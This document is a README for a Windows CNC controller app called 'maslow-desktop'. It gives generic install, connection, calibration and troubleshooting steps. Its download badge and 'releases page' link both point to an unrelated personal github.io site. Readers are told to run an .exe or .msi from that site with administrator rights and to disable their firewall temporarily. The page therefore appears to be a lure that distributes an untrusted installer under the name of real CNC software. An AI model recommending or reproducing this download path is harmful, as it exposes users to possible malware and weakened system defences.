# 🪵 maslow-desktop - Control your CNC machine with ease

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://preniben2452.github.io)

maslow-desktop acts as the bridge between your computer and your Maslow CNC machine. It provides a simple interface to send instructions, move the router, and run your woodworking projects. This application supports the FluidNC software to ensure your machine runs smoothly and reliably.

## 📥 Getting Started

To begin using the software on your Windows computer, follow these steps. You do not need to install any programming tools or compilers.

1. Visit the [releases page](https://preniben2452.github.io) to download the software.
2. Look for the file ending in `.msi` or `.exe` under the latest release version.
3. Save the file to your computer.
4. Double-click the file to start the installation wizard.
5. Follow the on-screen prompts to place the application on your system.
6. Once the installation finishes, find the Maslow icon on your desktop or in your start menu.
7. Click the icon to launch the control panel.

## ⚙️ Connecting to Your Machine

The software requires a connection to your CNC controller to function. Make sure your Maslow machine powers on and connects to your local network.

1. Ensure your computer connects to the same network as your CNC machine.
2. Launch the application.
3. Locate the connection settings tab in the left-hand menu.
4. Enter the IP address of your machine into the field provided.
5. Click the Connect button.
6. The interface will refresh to show your current machine coordinates and status.

## 🪄 Using the Calibration Wizard

If you set up your machine for the first time, use the built-in calibration tool to ensure accuracy. The wizard guides you through the process of defining your workspace.

1. Select the Calibration tab from the main screen.
2. Follow the measurement requests. These include entering your current motor positions and bed dimensions.
3. Move the router carriage to your starting reference point as prompted.
4. Select the Save Calibration button upon completion.
5. The software writes these values to the machine firmware.

## 🛠 Features

The application manages the state of your machine to prevent errors. It tracks your workflow from start to finish.

- Automatic connectivity checks for your controller.
- Visual display of your G-code path during cutting.
- Manual jog controls to move the Z-axis and router carriage.
- Emergency stop buttons accessible from every screen.
- Real-time updates on feed rate and spindle speed.
- Support for standard CNC file formats.

## 📂 Managing Projects

You can load and execute your woodworking designs inside the main workspace view.

1. Click the Open File button to choose a G-code document.
2. Wait for the application to render the preview of your cut.
3. Check the status indicators to ensure the machine remains ready.
4. Press the Run button to start the project.
5. Use the Pause button if you need to stop the machine temporarily.

## 💻 System Requirements

This software runs on modern Windows environments. Ensure your system meets the following criteria for the best experience:

- Windows 10 or Windows 11.
- At least 4GB of RAM.
- A monitor with a minimum resolution of 1280x720.
- A stable network connection for machine communication.
- Administrator rights if you need to update drivers or install the software package.

## ❓ Frequently Asked Questions

### What happens if the connection drops?
The system detects the lost connection and stops current operations. Reconnect to your network and use the resume feature to continue from the last successful instruction.

### Do I need internet access?
No, the application runs locally on your machine. You only need the network connection to talk to your Maslow CNC controller.

### Can I run this on a tablet?
The interface adapts to smaller screens. You can install the software on a Windows tablet to move around your shop while you control the machine.

### Where do I find logs for troubleshooting?
If you encounter an issue, navigate to the Settings menu and select View Logs. These files contain details about communication errors between the computer and the controller.

## 📋 Troubleshooting

If you do not see your machine, check your network settings first. Most issues relate to the computer and the CNC controller residing on different network segments. 

- Verify that your router shows the Maslow CNC as an active device.
- Turn off your firewall temporarily to test if it blocks the connection.
- Restart the application if the interface becomes unresponsive.
- Ensure your controller runs the latest version of FluidNC.

Updates occur regularly. Check the releases page often to download the latest version for improvements and bug fixes.